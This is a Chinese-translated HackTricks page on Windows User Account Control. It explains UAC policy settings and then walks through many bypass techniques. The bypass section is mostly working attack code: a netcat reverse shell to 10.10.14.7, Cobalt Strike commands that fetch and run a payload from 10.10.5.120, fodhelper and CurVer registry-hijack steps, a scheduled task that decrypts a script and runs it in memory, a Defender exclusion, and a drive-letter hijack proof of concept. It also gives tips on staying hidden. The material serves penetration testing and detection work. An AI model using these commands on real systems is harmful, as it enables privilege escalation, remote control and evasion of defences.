# UAC - 用户帐户控制

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个用于在执行提升权限的操作时启用“同意提示”的功能。应用程序具有不同的 `integrity` 等级，具有**高等​​级别**的程序可以执行**可能危及系统**的任务。当启用 UAC 时，应用程序和任务默认**在非管理员帐户的安全上下文下运行**，除非管理员明确授权这些应用/任务以管理员级别访问系统来运行。它是一个保护管理员免受意外更改的便利功能，但不被视为安全边界。

有关完整的 integrity 等级信息：


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

当启用 UAC 时，管理员用户会获得两个 token：一个用于以常规级别执行常规操作的标准用户令牌，另一个带有管理员权限。

此 [页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 对 UAC 的工作原理进行了详尽讨论，包括登录过程、用户体验和 UAC 架构。管理员可以使用安全策略在本地级别（使用 secpol.msc）配置 UAC 的工作方式，或在 Active Directory 域环境中通过 GPO（Group Policy Objects）进行配置和推送。各种设置在[此处](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)有详细讨论。UAC 有 10 个可通过组策略设置的选项。下表提供了更多细节：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

本地安全策略（大多数系统上的 "secpol.msc"）默认配置为**阻止非管理员用户安装软件**。这意味着即使非管理员用户能够下载你的软件安装程序，他们也无法在没有管理员帐户的情况下运行它。

### Registry Keys to Force UAC to Ask for Elevation

作为没有管理员权限的标准用户，你可以确保在尝试执行某些操作时，UAC 会**提示该“标准”帐户输入凭据**。这需要修改某些**注册表项**，通常需要管理员权限，除非存在 **UAC bypass**，或攻击者已以管理员身份登录。

即使用户属于 **Administrators** 组，这些更改也会强制用户**重新输入其帐户凭据**以执行管理操作。

**唯一的缺点是，这种方法需要禁用 UAC 才能生效，而在生产环境中这通常不太可能。**

必须更改的注册表键和条目如下（括号中为默认值）：

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

也可以通过本地安全策略工具手动完成此操作。更改后，管理操作会提示用户重新输入凭据。

### Note

**User Account Control 不是安全边界。** 因此，标准用户不能通过其帐户突破并在没有本地权限提升漏洞的情况下获得管理员权限。

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode 使用完整性检查来防止高完整性级别的进程（例如 web browsers）访问低完整性级别的数据（例如 temporary Internet files 文件夹）。这是通过以低完整性 token 运行浏览器来实现的。当浏览器尝试访问存储在低完整性区域的数据时，操作系统会检查该进程的完整性级别并据此允许或拒绝访问。此功能有助于防止 remote code execution 攻击获取系统上的敏感数据。
- 当用户登录到 Windows 时，系统会创建一个 access token，其中包含该用户的 privileges 列表。Privileges 定义为用户权限和能力的组合。该 token 还包含用户的 credentials 列表，这些 credentials 用于向计算机和网络资源验证用户身份。

### Autoadminlogon

要配置 Windows 在启动时自动以特定用户登录，请设置 **`AutoAdminLogon` registry key**。这对于 kiosk 环境或测试目的很有用。仅在安全的系统上使用，因为它会在注册表中暴露密码。

使用 Registry Editor 或 `reg add` 设置以下键：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

若要恢复为正常登录行为，请将 `AutoAdminLogon` 设置为 0。

## UAC bypass

> [!TIP]
> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears

在以下情况下需要 UAC bypass：**UAC 已启用，你的进程在 medium integrity 上下文中运行，并且你的用户属于 administrators 组。**

需要说明的是，如果 UAC 处于最高安全级别（Always），**比起处于其他级别（Default）要难得多**。

### UAC disabled

如果 UAC 已禁用（`ConsentPromptBehaviorAdmin` 是 **`0`**），你可以使用类似的方法 **execute a reverse shell with admin privileges**（high integrity level）：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常** 基本的 UAC "bypass"（完整文件系统访问）

如果你拥有一个属于 Administrators 组的用户的 shell，你可以 **mount the C$** 共享（通过 SMB 在本地挂载为一个新磁盘），这样你就会 **access to everything inside the file system**（甚至 Administrator 的主目录）。

> [!WARNING]
> **看起来这个技巧不再有效了**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 cobalt strike 绕过 UAC

只有在 UAC 未设置为最高安全级别时，Cobalt Strike 的技术才会生效。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也有多个模块可以 **bypass** **UAC**。

### KRBUACBypass

文档和工具在 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) 是多个 UAC bypass exploits 的 **集合**。注意你需要 **使用 visual studio 或 msbuild 编译 UACME**。编译会产生多个可执行文件（例如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），你需要知道 **需要哪一个。**\
你应该 **小心**，因为某些 bypasses 会 **提示其他程序**，这些程序会 **提醒** **用户** 有事情正在发生。

UACME 列出每个 technique 开始生效的 **build version**。你可以搜索影响你版本的 technique：
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
另外，使用 [this](https://en.wikipedia.org/wiki/Windows_10_version_history) 页面，你可以从构建版本中获得 Windows 发布版本 `1607`。

### UAC Bypass – fodhelper.exe (Registry hijack)

受信任的二进制文件 `fodhelper.exe` 在现代 Windows 上会自动提升权限。启动时，它会查询下列每用户注册表路径，而不验证 `DelegateExecute` 值。通过在该处植入命令，可以让一个 Medium Integrity 进程（用户属于 Administrators）在不出现 UAC prompt 的情况下生成一个 High Integrity 进程。

fodhelper 查询的注册表路径：
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 步骤（设置你的 payload，然后触发）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注意：
- 当当前用户是 Administrators 成员且 UAC 级别为默认/宽松（不是带有额外限制的 Always Notify）时可用。
- 使用 `sysnative` 路径可在 64 位 Windows 上从 32 位进程启动 64 位 PowerShell。
- Payload 可以是任何命令（PowerShell、cmd 或 EXE 路径）。为保持隐蔽，避免弹出提示 UI。

#### CurVer/extension hijack variant (HKCU only)

最近滥用 `fodhelper.exe` 的样本会避开 `DelegateExecute`，而改为通过每用户的 `CurVer` 值 **重定向 `ms-settings` ProgID**。该自动提升的二进制仍会在 `HKCU` 下解析处理程序，因此无需 admin token 即可写入这些键：
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
一旦提权，恶意软件通常通过将 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` 设置为 `0` 来**禁用未来的提示**，然后执行额外的防御规避（例如，`Add-MpPreference -ExclusionPath C:\ProgramData`）并重新创建持久性以在高完整性运行。一个典型的持久性任务将在磁盘上存储一个**XOR-encrypted PowerShell script**，并每小时在内存中解码/执行：
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.

#### 更多 UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ 应该可行)

### 使用 GUI 的 UAC Bypass

如果你能访问到 **GUI，你可以在出现 UAC 提示时直接接受**，实际上不需要绕过它。因此，获得 GUI 访问将允许你绕过 UAC。

此外，如果你获得了某人正在使用的 GUI 会话（可能通过 RDP），有一些工具会以管理员身份运行，你可以从这些工具直接以管理员身份运行一个 **cmd**，例如不再被 UAC 提示，像 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能更具 **隐蔽性**。

### 噪声大的暴力 UAC bypass

如果你不介意产生噪声，你也可以总是 **运行类似** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 的工具，它会 **不断请求提升权限直到用户接受为止**。

### Your own bypass - Basic UAC bypass methodology

If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
   1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
   2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### 另一种 UAC bypass 技术

该方法是监视一个 **autoElevated binary** 是否尝试从 **registry** 读取将被 **执行** 的 **binary** 或 **command** 的 **name/path**（如果该二进制在 **HKCU** 中查找这些信息则更有趣）。

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考资料
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
